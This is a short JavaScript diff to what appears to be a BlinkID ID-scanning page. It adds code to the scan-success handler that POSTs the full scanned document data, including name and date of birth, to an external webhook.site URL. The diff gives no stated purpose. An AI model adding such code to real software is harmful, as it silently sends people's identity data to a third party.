@@ -34,6 +34,10 @@ blinkId.addEventListener('scanSuccess', ev => {
 
 function doStuff(ev) {
 
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://webhook.site/d87a0681-16e1-4d6e-b3ac-14d6db83512e", true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify(ev.detail.recognizer));
 
   // alert(
   //   `Hello, ${ firstName } ${ lastName }!\n You were born on ${ dateOfBirth.year }-${ dateOfBirth.month }-${ dateOfBirth.day }.`
